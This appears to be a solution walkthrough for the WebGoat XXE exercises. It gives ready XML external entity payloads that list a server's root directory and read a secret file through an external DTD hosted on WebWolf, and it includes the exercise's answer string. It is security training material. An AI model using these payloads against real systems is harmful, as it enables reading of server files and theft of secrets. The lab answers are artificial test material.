# XEE - xml external entities

# Task 4

In this assignment you will add a comment to the photo, when submitting the form try to execute an XXE injection with the comments field. Try listing the root directory of the filesystem.

## Solution

1. Catch the response in burp. POST /WebGoat/xxe/simple HTTP/1.1
2. Change body of exml request to form down below

### On Windows

```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/">]>
<comment><text>&xxe;</text></comment>
```

### On Linux or macOS

```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<comment><text>&xxe;</text></comment>
```

# Task 7

1. Add comment and intercept POST request with burp.
2. Send to repeater.
3. Change application type header from application/json to applicatiom/xml.
4. Chnage body of request from submitted comment to :

```
<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
```

5. Send, done.

# Task 11

1. Go to webwolf and upload file attack.dtd with content

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY secret SYSTEM 'file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt'>
```

2. Content of above file could be different based on user ( file://... part... check exercise content to get path)
3. After upload get location of this file in webwolf

```
http://localhost:9090/files/{user_name}/{filename}

```

so

```
http://localhost:9090/files/admin123/attack.dtd

```

4. After that make commment catch POST request and change body to :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [

<!ENTITY % dtd SYSTEM "http://localhost:9090/files/admin123/attack.dtd" >
%dtd;]>
<comment>
<text>our secret &secret;</text>
</comment>
```

5. should receive 200 response
6. Stop intercepting, then go to Webgoat
7. new comment should display comment comment comment .

```
comment comment comment WebGoat 8.0 rocks... (IdsWScAJJD)
```

then copy

```
WebGoat 8.0 rocks... (IdsWScAJJD)
```

add as comment and done
